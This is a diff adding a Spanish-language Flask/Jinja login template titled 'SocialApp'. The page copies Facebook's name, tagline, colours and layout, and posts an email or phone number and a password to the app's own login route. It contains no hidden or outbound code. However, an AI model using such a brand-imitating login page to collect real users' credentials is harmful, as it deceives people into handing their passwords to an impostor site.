@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - SocialApp</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center; /* Centrar los elementos horizontalmente */
+            align-items: center;     /* Centrar verticalmente */
+            padding: 50px 0;         /* Ajusta el padding para mantener el espacio arriba y abajo */
+            height: 100vh;           /* Mantener el 100% de la altura de la pantalla */
+        }
+        .left-section {
+            max-width: 500px; /* Aumenté el ancho de la columna */
+            margin-right: 85px; /* Espacio entre las columnas */
+            margin-top: -290px;
+        }
+        .left-section h1 {
+            font-size: 60px;
+            color: #1877f2;
+            font-weight: bold; /* Hace que el texto "facebook" esté en negrita */
+        }
+        .left-section p {
+            font-size: 28px; /* Mantener el tamaño de la fuente */
+            color: black;
+            line-height: 1.2; /* Reducir el interlineado */
+            margin-top: 0px; /* Ajusta el margen superior */
+            margin-bottom: 0; /* Elimina el espacio extra en la parte inferior */
+        }
+        .right-section {
+            background-color: white;
+            width: 350px;
+            padding: 20px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: -200px; /* Mantengo el margen superior reducido */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Mantengo la sombra */
+            border: 1px solid transparent; /* Quito el borde grueso con borde transparente */
+        }
+        .input-group {
+            margin-bottom: 15px;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            position: relative; /* Necesario para posicionar el botón del ojo */
+        }
+        .input-group input {
+            font-size: 17px;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid gray;
+            border-radius: 4px;
+            width: 100%;
+        }
+        .input-group input::placeholder {
+            color: gray;
+        }
+        .eye-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: none; /* Inicialmente oculto */
+        }
+        .eye-icon {
+            font-style: normal; /* Asegura que el texto no esté en cursiva */
+            font-size: 20px; /* Ajusta el tamaño según sea necesario */
+            line-height: 1; /* Ajusta el interlineado */
+
+
+        }
+        .input-group input:focus + .eye-btn {
+            display: block; /* Aparece cuando el campo está enfocado */
+        }
+        .btn-primary, .btn-secondary {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        .btn-primary {
+            background-color: #1877f2;
+            color: white;
+            font-size: 20px;
+        }
+        .btn-primary:hover {
+            background-color: #155e8e;
+        }
+        .btn-secondary {
+            background-color: #42b72a;
+            color: white;
+            font-size: 18px;
+        }
+        .btn-secondary:hover {
+            background-color: #35841d;
+        }
+        .forgot-password {
+            color: #1877f2;
+            cursor: pointer;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .flash {
+            padding: 10px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .flash.success {
+            background-color: #d4edda;
+            color: #155724;
+            border-color: #c3e6cb;
+        }
+        .separator {
+            width: 95%; /* La línea ocupará el 90% del ancho */
+            border-top: 1px solid #ddd; /* Línea fina y discreta */
+            margin: 20px 0;
+        }
+        .create-page {
+            font-size: 18px;
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            width: 30%; /* Reduce el ancho del contenedor en el eje X */
+            margin-left: auto;  /* Centra el contenedor */
+            margin-right: auto; /* Centra el contenedor */
+        }
+        .create-page b {
+            font-weight: bold; /* Pone en negrita el texto "Crea una página" */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Left Section -->
+    <div class="left-section">
+        <h1>facebook</h1>
+        <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+    </div>
+
+    <!-- Right Section (Login Form) -->
+    <div class="right-section">
+        <!-- Flash messages -->
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="flash {% if category == 'success' %}success{% endif %}">{{ message }}</div>
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+        
+        <form method="POST" action="{{ url_for('login') }}" style="width: 100%; text-align: center;">
+            <div class="input-group">
+                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+            </div>
+            <div class="input-group">
+                <input id="password" type="password" name="password" placeholder="Contraseña" required oninput="toggleEye()">
+                <button type="button" id="eye-btn" class="eye-btn" onclick="togglePasswordVisibility()">
+                    <i class="eye-icon">👀</i>
+                </button>
+            </div>
+            <button type="submit" class="btn-primary">Iniciar sesión</button>
+        </form>
+
+        <p class="forgot-password" onclick="forgotPassword()">¿Has olvidado tu contraseña?</p>
+
+        <!-- Línea de separación -->
+        <div class="separator"></div>
+
+        <button class="btn-secondary" onclick="createAccount()">Crear una cuenta nueva</button>
+    </div>
+</div>
+
+<!-- Nuevo texto fuera del cuadro de inicio de sesión, debajo -->
+<div class="create-page">
+    <p><b>Crea una página</b> para un famoso, una marca o una empresa.</p>
+</div>
+
+<script>
+    function forgotPassword() {
+        alert("Se va a recuperar la contraseña.");
+    }
+
+    function createAccount() {
+        alert("Se va a crear una cuenta.");
+    }
+
+    function toggleEye() {
+        var passwordInput = document.getElementById('password');
+        var eyeButton = document.getElementById('eye-btn');
+        
+        // Muestra el ícono del ojo solo si el campo de contraseña tiene texto
+        if (passwordInput.value.length > 0) {
+            eyeButton.style.display = 'block';
+        } else {
+            eyeButton.style.display = 'none';
+        }
+    }
+
+    function togglePasswordVisibility() {
+        var passwordInput = document.getElementById('password');
+        var eyeIcon = document.querySelector('.eye-icon');
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text'; // Muestra la contraseña
+            eyeIcon.textContent = '🙈'; // Cambio el ícono a uno de "cerrado"
+        } else {
+            passwordInput.type = 'password'; // Oculta la contraseña
+            eyeIcon.textContent = '👀'; // Cambio el ícono a uno de "abierto"
+        }
+    }
+</script>
+
+</body>
+</html>
